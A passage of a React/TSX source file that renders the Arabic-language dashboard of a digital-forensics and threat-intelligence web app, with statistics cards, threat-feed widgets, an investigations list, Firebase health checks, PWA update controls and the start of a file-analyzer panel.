                      الانتقال إلى النطاق الرسمي ({PRIMARY_VERCEL_DOMAIN})
                    </a>
                  </div>
                )}
              </div>
            </div>
          </div>
        ) : (
          <>
            {!isEmailVerifiedOrGoogle && !verificationSent && (
              <div className="bg-amber-500/10 border border-amber-500/30 p-4 rounded-2xl flex flex-col md:flex-row items-center justify-between gap-4">
                <div className="flex items-center gap-3 text-amber-400">
                  <AlertTriangle className="w-5 h-5 shrink-0" />
                  <span className="text-xs font-bold leading-relaxed">يرجى التحقق من بريدك الإلكتروني لتأمين حسابك بالكامل والوصول لجميع الميزات.</span>
                </div>
                <button 
                  onClick={() => sendEmailVerification(user).then(() => setVerificationSent(true))}
                  className="px-4 py-2 bg-amber-500 text-gray-950 text-[10px] font-bold rounded-lg shadow-lg hover:bg-amber-400 transition"
                >
                  إعادة إرسال رسالة التحقق
                </button>
              </div>
            )}
            {verificationSent && (
              <div className="bg-emerald-500/10 border border-emerald-500/30 p-4 rounded-2xl flex items-center gap-3 text-emerald-400">
                <CheckCircle2 className="w-5 h-5 shrink-0" />
                <span className="text-xs font-bold">تم إرسال رابط التحقق بنجاح. يرجى مراجعة صندوق الوارد (أو المزعج).</span>
              </div>
            )}
            <div
              className={
                uiPrefs.layoutStructure === 'multi_grid'
                  ? uiPrefs.multiGridColumns === 3
                    ? 'grid grid-cols-1 lg:grid-cols-2 2xl:grid-cols-3 gap-6 items-start sovereign-multi-grid'
                    : 'grid grid-cols-1 xl:grid-cols-2 gap-6 items-start sovereign-multi-grid'
                  : uiPrefs.layoutStructure === 'full_width_stack'
                  ? 'space-y-6 sovereign-full-stack'
                  : uiPrefs.layoutStructure === 'compact_dashboard'
                  ? 'space-y-3'
                  : 'space-y-6'
              }
            >
        {isTabVisible('dashboard') && (
          <div className="space-y-6">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
              <div>
                <h2 className="text-2xl font-bold text-white tracking-tight">أهلاً بك، {userProfile?.displayName?.split(' ')[0] || 'أيها المحقق'} 🛡️</h2>
                <p className="text-gray-400 text-xs">نظام التحقيق الجنائي السيادي جاهز للعمل تحت هويتك الرقمية.</p>
              </div>
              <div className="flex flex-wrap items-center gap-2.5">
                <ExportMobilePackageButton onClick={() => setShowExportModal(true)} />
                <div className="flex items-center gap-2 text-[10px] font-mono text-[#D4AF37] bg-[#D4AF37]/5 px-3 py-1.5 rounded-lg border border-[#D4AF37]/20">
                  <Shield className="w-3 h-3" />
                  UID: {user.uid.substring(0, 12)}...
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
              <div className="bg-gray-900 border border-gray-800 p-6 rounded-2xl shadow-lg hover:border-[#D4AF37]/50 transition-colors">
                <div className="flex items-center justify-between mb-4">
                  <Briefcase className="w-6 h-6 text-[#D4AF37]" />
                  <span className="text-[10px] font-mono text-gray-500 uppercase tracking-widest">Investigations</span>
                </div>
                <div className="text-3xl font-bold text-white mb-1">
                  {statsLoading ? '...' : dashboardStats?.totalInvestigations || 0}
                </div>
                <div className="text-xs text-gray-400">إجمالي التحقيقات المفتوحة</div>
              </div>

              <div className="bg-gray-900 border border-gray-800 p-6 rounded-2xl shadow-lg hover:border-[#10B981]/50 transition-colors">
                <div className="flex items-center justify-between mb-4">
                  <Database className="w-6 h-6 text-[#10B981]" />
                  <span className="text-[10px] font-mono text-gray-500 uppercase tracking-widest">Evidence</span>
                </div>
                <div className="text-3xl font-bold text-white mb-1">
                  {statsLoading ? '...' : dashboardStats?.totalEvidence || 0}
                </div>
                <div className="text-xs text-gray-400">قطع الأدلة الرقمية المحفوظة</div>
              </div>

              <div className="bg-gray-900 border border-gray-800 p-6 rounded-2xl shadow-lg hover:border-red-500/50 transition-colors">
                <div className="flex items-center justify-between mb-4">
                  <AlertTriangle className="w-6 h-6 text-red-500" />
                  <span className="text-[10px] font-mono text-gray-500 uppercase tracking-widest">Threats</span>
                </div>
                <div className="text-3xl font-bold text-white mb-1">
                  {statsLoading ? '...' : dashboardStats?.detectedThreats || 0}
                </div>
                <div className="text-xs text-gray-400">تهديدات محتملة تم رصدها</div>
              </div>

              <div className="bg-gray-900 border border-gray-800 p-6 rounded-2xl shadow-lg hover:border-blue-500/50 transition-colors">
                <div className="flex items-center justify-between mb-4">
                  <FileText className="w-6 h-6 text-blue-500" />
                  <span className="text-[10px] font-mono text-gray-500 uppercase tracking-widest">Reports</span>
                </div>
                <div className="text-3xl font-bold text-white mb-1">
                  {statsLoading ? '...' : dashboardStats?.totalLogs || 0}
                </div>
                <div className="text-xs text-gray-400">سجلات العمليات والأرشفة</div>
              </div>
            </div>

            {/* Live Browser History & Threat Intelligence Dashboard Widget */}
            {(browserAiReport || evidenceList.some(e => e.mimeType === 'application/x-sqlite3' && (e.analysis?.authenticityScore ?? 100) < 50)) && (
              <div className="bg-gradient-to-r from-gray-900 via-gray-900 to-red-950/25 border border-red-500/40 rounded-2xl p-5 shadow-xl space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-gray-800">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-xl bg-red-500/15 border border-red-500/40 flex items-center justify-center text-red-400">
                      <Globe className="w-5 h-5" />
                    </div>
                    <div>
                      <h3 className="text-sm font-bold text-white flex items-center gap-2">
                        تهديدات قواعد بيانات المتصفحات وسجل التصفح (Browser History Threat Feed)
                      </h3>
                      <p className="text-xs text-gray-400">
                        {browserAiReport
                          ? `${browserAiReport.behaviorClassification} • درجة التهديد: ${browserAiReport.threatScore}/100 (${browserAiReport.riskLevel})`
                          : 'تم رصد مؤشرات تصفح مشبوهة في قاعدة بيانات SQLite محفوظة في الأدلة.'}
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={() => setActiveTab('browser')}
                    className="px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition shrink-0"
                  >
                    فتح مختبر سجل المتصفح (SQLite)
                  </button>
                </div>

                {browserAiReport && browserAiReport.suspiciousSites.length > 0 && (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    {browserAiReport.suspiciousSites.slice(0, 4).map((site, idx) => (
                      <div key={idx} className="p-3 bg-gray-950 rounded-xl border border-red-500/25 space-y-1">
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-xs font-mono font-bold text-red-400 truncate" dir="ltr">
                            {site.domain}
                          </span>
                          <span className="px-2 py-0.5 rounded bg-red-500/15 text-red-300 text-[10px] font-bold shrink-0">
                            {site.category} • {site.severity}
                          </span>
                        </div>
                        <div className="text-[11px] font-mono text-gray-400 truncate" dir="ltr">
                          {site.url}
                        </div>
                        <p className="text-[11px] text-gray-300">{site.reason}</p>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Live Global Threat Intelligence Dashboard Alerts */}
            {(threatIntelHistory.length > 0 || evidenceList.some(e => e.mimeType === 'application/vnd.sovereign.threat-intel+json' && (e.analysis?.authenticityScore ?? 100) < 50)) && (
              <div className="bg-gradient-to-r from-gray-900 via-gray-900 to-amber-950/20 border border-[#D4AF37]/40 rounded-2xl p-5 shadow-xl space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-gray-800">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-xl bg-[#D4AF37]/15 border border-[#D4AF37]/40 flex items-center justify-center text-[#D4AF37]">
                      <ShieldAlert className="w-5 h-5" />
                    </div>
                    <div>
                      <h3 className="text-sm font-bold text-white">
                        قسم الاستخبارات السيبرانية والتهديدات العالمية (Global Threat Intelligence Feed)
                      </h3>
                      <p className="text-xs text-gray-400">
                        فحوصات مؤشرات الخطر (IP / Domain / Hash) المرتبطة بسجل التهديدات والعمليات في لوحة التحكم.
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={() => setActiveTab('threat_intel')}
                    className="px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition shrink-0"
                  >
                    فتح محرك الاستخبارات العالمي
                  </button>
                </div>

                {threatIntelHistory.length > 0 && (
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                    {threatIntelHistory.slice(0, 3).map((item, idx) => (
                      <div
                        key={idx}
                        onClick={() => {
                          setThreatIntelResult(item.fullPayload);
                          setThreatIntelInput(item.indicator);
                          setActiveTab('threat_intel');
                        }}
                        className={`p-3.5 bg-gray-950 rounded-xl border cursor-pointer transition space-y-1.5 ${
                          item.isMalicious ? 'border-red-500/40 hover:border-red-400' : 'border-emerald-500/30 hover:border-[#D4AF37]'
                        }`}
                      >
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-xs font-mono font-bold text-white truncate" dir="ltr">
                            {item.indicator}
                          </span>
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-bold shrink-0 ${
                              item.isMalicious ? 'bg-red-500/20 text-red-300' : 'bg-emerald-500/15 text-emerald-300'
                            }`}
                          >
                            {item.riskLevel} ({item.threatScore}/100)
                          </span>
                        </div>
                        <div className="text-[11px] text-gray-400 truncate">
                          {item.country} • {item.asn}
                        </div>
                        <div className="text-[11px] font-bold text-[#D4AF37] truncate">{item.verdict}</div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Live Malicious Script & Payload Deobfuscation Alerts */}
            {(scriptAiReport || evidenceList.some(e => e.mimeType === 'application/vnd.sovereign.script-forensics' && (e.analysis?.authenticityScore ?? 100) < 50)) && (
              <div className="bg-gradient-to-r from-gray-900 via-gray-900 to-purple-950/20 border border-[#D4AF37]/40 rounded-2xl p-5 shadow-xl space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-gray-800">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-xl bg-[#D4AF37]/15 border border-[#D4AF37]/40 flex items-center justify-center text-[#D4AF37]">
                      <FileCode className="w-5 h-5" />
                    </div>
                    <div>
                      <h3 className="text-sm font-bold text-white">
                        تحليل السكربتات الخبيثة وفك التشويه (Malicious Script & Payload Deobfuscator)
                      </h3>
                      <p className="text-xs text-gray-400">
                        فك الطبقات المموهة واستخراج الأوامر والروابط الخفية مع التقييم الجنائي عبر Neural-X Deobfuscator Core.
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={() => setActiveTab('deobfuscator')}
                    className="px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition shrink-0"
                  >
                    فتح محلل السكربتات
                  </button>
                </div>

                {scriptAiReport && scriptStaticResult && (
                  <div className="p-4 bg-gray-950 rounded-xl border border-gray-800 flex flex-col md:flex-row md:items-center justify-between gap-3">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-mono font-bold text-white" dir="ltr">
                          {scriptStaticResult.fileName}
                        </span>
                        <span className="px-2 py-0.5 rounded bg-gray-800 text-[#D4AF37] text-[10px] font-mono">
                          {scriptStaticResult.language} • {scriptStaticResult.layersCount} Layers
                        </span>
                      </div>
                      <p className="text-xs text-gray-300">{scriptAiReport.executiveSummary}</p>
                    </div>
                    <span
                      className={`px-3 py-1.5 rounded-lg text-xs font-bold shrink-0 ${
                        scriptAiReport.isMalicious
                          ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                          : 'bg-emerald-500/15 text-emerald-300 border border-emerald-500/30'
                      }`}
                    >
                      {scriptAiReport.malwareFamilyOrType} • {scriptAiReport.riskLevel} ({scriptAiReport.threatScore}/100)
                    </span>
                  </div>
                )}
              </div>
            )}

            {/* Live Deep Binary & Executable Forensics Dashboard Card */}
            {(binaryLabAiReport || evidenceList.some(e => e.mimeType === 'application/vnd.sovereign.binary-forensics' && (e.analysis?.authenticityScore ?? 100) < 50)) && (
              <div className="bg-gradient-to-r from-gray-900 via-gray-900 to-cyan-950/20 border border-[#D4AF37]/40 rounded-2xl p-5 shadow-xl space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-gray-800">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 rounded-xl bg-[#D4AF37]/15 border border-[#D4AF37]/40 flex items-center justify-center text-[#D4AF37]">
                      <Cpu className="w-5 h-5" />
                    </div>
                    <div>
                      <h3 className="text-sm font-bold text-white">
                        مختبر الملفات التنفيذية والفحص الثنائي العميق (PE / ELF & Binary Headers)
                      </h3>
                      <p className="text-xs text-gray-400">
                        تفكيك ترويسات PE/ELF والمقاطع والدوال المستوردة واستخراج النصوص الخفية عبر Sovereign Core Engine v3.5.
                      </p>
                    </div>
                  </div>
                  <button
                    onClick={() => setActiveTab('binary_lab')}
                    className="px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition shrink-0"
                  >
                    فتح مختبر الباينري العميق
                  </button>
                </div>

                {binaryLabAiReport && binaryLabStaticResult && (
                  <div className="p-4 bg-gray-950 rounded-xl border border-gray-800 flex flex-col md:flex-row md:items-center justify-between gap-3">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <span className="text-xs font-mono font-bold text-white" dir="ltr">
                          {binaryLabStaticResult.fileName}
                        </span>
                        <span className="px-2 py-0.5 rounded bg-gray-800 text-[#D4AF37] text-[10px] font-mono">
                          {binaryLabStaticResult.format} • Entropy {binaryLabStaticResult.overallEntropy}
                        </span>
                      </div>
                      <p className="text-xs text-gray-300">{binaryLabAiReport.executiveSummary}</p>
                    </div>
                    <span
                      className={`px-3 py-1.5 rounded-lg text-xs font-bold shrink-0 ${
                        binaryLabAiReport.isMalicious
                          ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                          : 'bg-emerald-500/15 text-emerald-300 border border-emerald-500/30'
                      }`}
                    >
                      {binaryLabAiReport.threatClassification} • {binaryLabAiReport.riskLevel} ({binaryLabAiReport.threatScore}/100)
                    </span>
                  </div>
                )}
              </div>
            )}

            {/* Live Threat Feeds & Automated Sync Status Widget on Dashboard */}
            <div className="bg-gradient-to-r from-gray-900 via-gray-900 to-emerald-950/20 border border-[#D4AF37]/40 rounded-2xl p-5 shadow-xl space-y-4">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-3 pb-3 border-b border-gray-800">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-emerald-500/15 border border-emerald-500/40 flex items-center justify-center text-emerald-400">
                    <Activity className={`w-5 h-5 ${liveFeedsSyncing ? 'animate-spin' : ''}`} />
                  </div>
                  <div>
                    <div className="flex flex-wrap items-center gap-2">
                      <h3 className="text-sm font-bold text-white">
                        تغذيات الثغرات والتهديدات الحية والمزامنة التلقائية (Live Feeds & Auto-Sync)
                      </h3>
                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                          liveFeedsAutoSync
                            ? 'bg-emerald-500/15 text-emerald-300 border border-emerald-500/30'
                            : 'bg-gray-800 text-gray-400 border border-gray-700'
                        }`}
                      >
                        {liveFeedsAutoSync
                          ? `مزامنة آلية خلال ${Math.floor(liveFeedsCountdownSec / 60)}:${String(liveFeedsCountdownSec % 60).padStart(2, '0')}`
                          : 'المزامنة الآلية متوقفة'}
                      </span>
                    </div>
                    <p className="text-xs text-gray-400">
                      {liveFeedsResult
                        ? `متصل بـ ${liveFeedsResult.stats.activeSourcesOk}/${liveFeedsResult.stats.activeSourcesTotal} مصدر مفتوح (CISA KEV / Feodo C2 / CIRCL CVE / SANS / THN) • آخر تحديث: ${formatTimestampSafe(liveFeedsResult.syncedAt, 'time')}`
                        : 'جاري تهيئة الاتصال بمصادر التهديدات المفتوحة...'}
                    </p>
                  </div>
                </div>
                <div className="flex flex-wrap items-center gap-2 shrink-0">
                  <button
                    onClick={() => void syncLiveThreatFeedsNow(false)}
                    disabled={liveFeedsSyncing}
                    className="px-3.5 py-2 bg-gray-950 hover:bg-gray-800 border border-[#D4AF37]/40 text-[#D4AF37] font-bold text-xs rounded-xl transition flex items-center gap-1.5 disabled:opacity-50"
                  >
                    <RefreshCw className={`w-3.5 h-3.5 ${liveFeedsSyncing ? 'animate-spin' : ''}`} />
                    مزامنة الآن
                  </button>
                  <button
                    onClick={() => setActiveTab('live_feeds')}
                    className="px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-xs rounded-xl transition"
                  >
                    إدارة التغذيات الحية
                  </button>
                </div>
              </div>

              {liveFeedsResult && liveFeedsResult.items.length > 0 && (
                <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                  {liveFeedsResult.items.slice(0, 3).map((item) => (
                    <div
                      key={item.id}
                      onClick={() => setActiveTab('live_feeds')}
                      className={`p-3.5 bg-gray-950 rounded-xl border cursor-pointer transition space-y-1.5 ${
                        item.severity === 'critical'
                          ? 'border-red-500/40 hover:border-red-400'
                          : 'border-gray-800 hover:border-[#D4AF37]'
                      }`}
                    >
                      <div className="flex items-center justify-between gap-2">
                        <span className="text-[11px] font-mono font-bold text-[#D4AF37] truncate" dir="ltr">
                          {item.indicator}
                        </span>
                        <span
                          className={`px-2 py-0.5 rounded text-[10px] font-bold shrink-0 ${
                            item.severity === 'critical'
                              ? 'bg-red-500/20 text-red-300'
                              : item.severity === 'high'
                              ? 'bg-amber-500/20 text-amber-300'
                              : 'bg-gray-800 text-gray-300'
                          }`}
                        >
                          {item.severityAr}
                        </span>
                      </div>
                      <div className="text-xs font-bold text-white line-clamp-1">{item.title}</div>
                      <div className="text-[10px] text-gray-400 flex items-center justify-between">
                        <span>{item.sourceName}</span>
                        <span>{formatTimestampSafe(item.publishedAt, 'time')}</span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="lg:col-span-2 space-y-6">
                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6">
                  <div className="flex items-center justify-between mb-6">
                    <h3 className="text-lg font-bold text-white">التحقيقات النشطة</h3>
                    <button 
                      onClick={() => {
                        setNewInvTitle('');
                        setShowNewInvModal(true);
                      }}
                      className="text-xs font-bold text-[#D4AF37] hover:underline flex items-center gap-1"
                    >
                      <Plus className="w-3.5 h-3.5" />
                      إنشاء تحقيق جديد
                    </button>
                  </div>
                  <div className="space-y-3">
                    {investigations.slice(0, 5).map(inv => (
                      <div 
                        key={inv.id} 
                        onClick={() => setCurrentInvestigationId(inv.id)}
                        className={`flex items-center justify-between p-4 rounded-xl border cursor-pointer transition ${
                          currentInvestigationId === inv.id ? 'bg-[#D4AF37]/10 border-[#D4AF37]/50' : 'bg-gray-950 border-gray-800 hover:border-gray-700'
                        }`}
                      >
                        <div className="flex items-center gap-3">
                          <Briefcase className={`w-5 h-5 ${currentInvestigationId === inv.id ? 'text-[#D4AF37]' : 'text-gray-500'}`} />
                          <div>
                            <div className="text-sm font-bold text-white">{inv.title}</div>
                            <div className="text-[10px] text-gray-500">{new Date(inv.createdAt).toLocaleString('ar-SA')}</div>
                          </div>
                        </div>
                        <div className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${inv.status === 'active' ? 'bg-[#10B981]/10 text-[#10B981]' : 'bg-gray-800 text-gray-400'}`}>
                          {inv.status === 'active' ? 'نشط' : 'مؤرشف'}
                        </div>
                      </div>
                    ))}
                    {investigations.length === 0 && (
                      <div className="text-center py-12 text-gray-500 text-sm">لا توجد تحقيقات نشطة حالياً.</div>
                    )}
                  </div>
                </div>

                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6">
                  <h3 className="text-lg font-bold text-white mb-6">سجل العمليات الأخير</h3>
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm text-right">
                      <thead className="text-xs text-gray-500 uppercase bg-gray-950/50">
                        <tr>
                          <th className="px-4 py-3 font-medium">العملية</th>
                          <th className="px-4 py-3 font-medium">الوقت</th>
                          <th className="px-4 py-3 font-medium">النتيجة</th>
                          <th className="px-4 py-3 font-medium">المخاطر</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-gray-800">
                        {auditLogs.slice(0, 5).map((log, idx) => (
                          <tr key={`${log.id}-${idx}`} className="bg-transparent hover:bg-gray-800/30 transition">
                            <td className="px-4 py-3 text-white font-medium">{log.fileName}</td>
                            <td className="px-4 py-3 text-gray-400 text-xs">{formatTimestampSafe(log.timestamp, 'time')}</td>
                            <td className="px-4 py-3">
                              <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${log.score >= 80 ? 'bg-[#10B981]/10 text-[#10B981]' : 'bg-red-500/10 text-red-400'}`}>
                                {log.verdict}
                              </span>
                            </td>
                            <td className="px-4 py-3 text-xs">{log.risk}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>

              <div className="space-y-6">
                <div className="bg-gradient-to-br from-gray-900 to-gray-950 border border-gray-800 rounded-2xl p-6 shadow-xl space-y-6">
                  <div>
                    <h3 className="text-sm font-bold text-white mb-4">حالة النظام الفني</h3>
                    <div className="space-y-4">
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-gray-400">البطارية:</span>
                        <span className={`font-mono flex items-center gap-1 ${batteryInfo.level > 20 ? 'text-[#10B981]' : 'text-red-500'}`}>
                          {batteryInfo.level}% {batteryInfo.charging && <BatteryCharging className="w-3 h-3" />}
                        </span>
                      </div>
                      <div className="w-full bg-gray-800 h-1.5 rounded-full overflow-hidden">
                        <div className="bg-[#10B981] h-full" style={{ width: `${batteryInfo.level}%` }}></div>
                      </div>

                      <div className="flex items-center justify-between text-xs">
                        <span className="text-gray-400">اتصال الشبكة:</span>
                        <span className={`font-mono flex items-center gap-1 ${networkInfo.online ? 'text-[#10B981]' : 'text-red-500'}`}>
                          {networkInfo.online ? 'Online' : 'Offline'} <Wifi className="w-3 h-3" />
                        </span>
                      </div>
                    </div>
                  </div>

                  <div className="pt-4 border-t border-gray-800 space-y-4">
                    <h3 className="text-sm font-bold text-white">اختبار تكامل Firebase</h3>
                    <div className="space-y-3">
                      <div className="flex items-center justify-between text-[10px] font-mono">
                        <span className="text-gray-400">Authentication:</span>
                        <span className={healthStatus.auth === 'pass' ? 'text-emerald-400' : healthStatus.auth === 'fail' ? 'text-red-400' : 'text-gray-600'}>
                          {healthStatus.auth.toUpperCase()}
                        </span>
                      </div>
                      <div className="flex items-center justify-between text-[10px] font-mono">
                        <span className="text-gray-400">Cloud Firestore:</span>
                        <span className={healthStatus.firestore === 'pass' ? 'text-emerald-400' : healthStatus.firestore === 'fail' ? 'text-red-400' : 'text-gray-600'}>
                          {healthStatus.firestore.toUpperCase()}
                        </span>
                      </div>
                      <div className="flex items-center justify-between text-[10px] font-mono">
                        <span className="text-gray-400">Firebase Storage:</span>
                        <span className={healthStatus.storage === 'pass' ? 'text-emerald-400' : healthStatus.storage === 'fail' ? 'text-red-400' : 'text-gray-600'}>
                          {healthStatus.storage.toUpperCase()}
                        </span>
                      </div>
                    </div>
                    <button 
                      onClick={runFullHealthCheck}
                      disabled={isTestingHealth}
                      className="w-full py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold text-[10px] rounded-lg transition disabled:opacity-50"
                    >
                      {isTestingHealth ? 'جاري الاختبار...' : 'بدء فحص النظام المتكامل'}
                    </button>
                    {healthStatus.lastRun && (
                      <div className="text-center text-[9px] text-gray-500">آخر فحص: {healthStatus.lastRun}</div>
                    )}
                  </div>
                </div>

                {/* Platform & Site Update Control Center Card */}
                <div className="bg-gradient-to-br from-gray-900 via-gray-900 to-amber-950/30 border border-gray-800 hover:border-[#D4AF37]/40 rounded-2xl p-6 shadow-xl space-y-4 transition">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="w-8 h-8 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 flex items-center justify-center text-[#D4AF37]">
                        <RefreshCw className={`w-4 h-4 ${update.isChecking ? 'animate-spin' : ''}`} />
                      </div>
                      <div>
                        <h3 className="text-sm font-bold text-white">تحديثات المنصة والموقع</h3>
                        <p className="text-[10px] text-gray-400 font-mono">PWA & Cache Management</p>
                      </div>
                    </div>
                    <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold font-mono ${
                      update.hasUpdate ? 'bg-amber-500/20 text-[#D4AF37] border border-[#D4AF37]/40 animate-pulse' : 'bg-emerald-500/10 text-emerald-400'
                    }`}>
                      {update.hasUpdate ? 'تحديث متوفر!' : 'محدث لآخر إصدار'}
                    </span>
                  </div>

                  <div className="space-y-2 text-xs">
                    <div className="flex items-center justify-between">
                      <span className="text-gray-400">الإصدار المثبت:</span>
                      <span className="font-mono text-gray-200 font-bold">v{APP_CURRENT_VERSION}</span>
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-gray-400">حالة الخدمة (Service Worker):</span>
                      {update.swStatus === 'active' ? (
                        <span className="text-emerald-400 flex items-center gap-1 font-mono text-[11px]">
                          <CheckCircle2 className="w-3 h-3" /> نشط ({update.swScriptUrl})
                        </span>
                      ) : update.swStatus === 'installing' || update.swStatus === 'pending' ? (
                        <span className="text-[#D4AF37] flex items-center gap-1 font-mono text-[11px]">
                          <RefreshCw className="w-3 h-3 animate-spin" /> جاري التسجيل ({update.swScriptUrl})
                        </span>
                      ) : (
                        <span className="text-amber-400 font-mono text-[11px]">غير مدعوم في هذا المتصفح</span>
                      )}
                    </div>
                    <div className="flex items-center justify-between">
                      <span className="text-gray-400">حزمة Android APK / PWA:</span>
                      <span className="text-emerald-400 font-mono text-[11px] flex items-center gap-1">
                        <Smartphone className="w-3 h-3" /> standalone • 192/512px
                      </span>
                    </div>
                    <div className="pt-1 flex justify-end">
                      <PWAInstallButton compact />
                    </div>
                  </div>

                  {update.hasUpdate && (
                    <div className="p-3 bg-amber-950/50 border border-[#D4AF37]/50 rounded-xl text-xs text-amber-200 space-y-2 animate-in fade-in">
                      <div className="font-bold flex items-center gap-1.5 text-white">
                        <AlertTriangle className="w-4 h-4 text-[#D4AF37]" />
                        هذا الموقع يريد تحديث!
                      </div>
                      <p className="text-[11px] text-gray-300">
                        يتوفر إصدار أحدث للموقع. انقر للتحديث الفوري وتفريغ الذاكرة المؤقتة.
                      </p>
                      <button
                        onClick={update.applyUpdateNow}
                        disabled={update.isUpdating}
                        className="w-full py-2 bg-[#D4AF37] hover:bg-[#c29d2f] text-gray-950 font-bold text-xs rounded-lg transition shadow-md flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
                      >
                        <RefreshCw className={`w-3.5 h-3.5 ${update.isUpdating ? 'animate-spin' : ''}`} />
                        {update.isUpdating ? 'جاري التحديث...' : 'تطبيق التحديث وإعادة التحميل الآن'}
                      </button>
                    </div>
                  )}

                  <div className="grid grid-cols-2 gap-2 pt-2">
                    <button
                      onClick={() => update.checkForUpdates(true)}
                      disabled={update.isChecking}
                      className="py-2 px-3 bg-gray-800 hover:bg-gray-700 text-gray-200 font-medium text-xs rounded-xl border border-gray-700 transition flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-50"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${update.isChecking ? 'animate-spin text-[#D4AF37]' : ''}`} />
                      {update.isChecking ? 'جاري الفحص...' : 'فحص التحديثات'}
                    </button>

                    <button
                      onClick={update.triggerSimulatedUpdate}
                      title="تجربة ظهور إشعار التحديث"
                      className="py-2 px-3 bg-gray-950 hover:bg-gray-800 text-[#D4AF37] font-medium text-xs rounded-xl border border-[#D4AF37]/30 hover:border-[#D4AF37] transition flex items-center justify-center gap-1.5 cursor-pointer"
                    >
                      <Sparkles className="w-3.5 h-3.5" />
                      تجربة التنبيه
                    </button>
                  </div>

                  <div className="pt-2 border-t border-gray-800/80">
                    <ExportMobilePackageButton variant="compact" onClick={() => setShowExportModal(true)} />
                  </div>
                </div>

                <div className="bg-gray-900 border border-gray-800 rounded-2xl p-6 text-center">
                  <Shield className="w-10 h-10 text-[#D4AF37] mx-auto mb-3" />
                  <h3 className="text-sm font-bold text-white mb-2">النظام محمي وموثق</h3>
                  <p className="text-[10px] text-gray-400 leading-relaxed">
                    جميع العمليات في هذه الجلسة مشفرة ومسجلة جنائياً لصالح المستخدم المصرح له. يتم تخزين الأدلة في بيئة سحابية معزولة.
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        {isTabVisible('analyzer') && (
          <div className="space-y-6">
            <div
              onDragOver={(e) => { e.preventDefault(); setIsDraggingFile(true); }}
              onDragLeave={() => setIsDraggingFile(false)}
              onDrop={(e) => {
                e.preventDefault();
                setIsDraggingFile(false);
                const dropped = e.dataTransfer.files?.[0];
                if (dropped) inspectPickedFile(dropped);
              }}
              className={`relative rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/90 to-gray-950 border-2 p-8 shadow-2xl overflow-hidden transition ${
                isDraggingFile ? 'border-[#D4AF37] bg-[#D4AF37]/5' : 'border-gray-800'
              }`}
            >
              <div className="relative z-10 max-w-3xl">
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-xs font-mono mb-3">
                  <Hash className="w-3.5 h-3.5" />
                  محرك الفحص الثنائي الفعلي • WebCrypto & Magic Bytes
                </div>
                <h1 className="text-3xl md:text-4xl font-bold tracking-tight text-white mb-3">
                  مختبر الفحص الثنائي وبصمات SHA-256 وكشف الترويسة
                </h1>
                <p className="text-gray-400 text-sm md:text-base leading-relaxed mb-6">
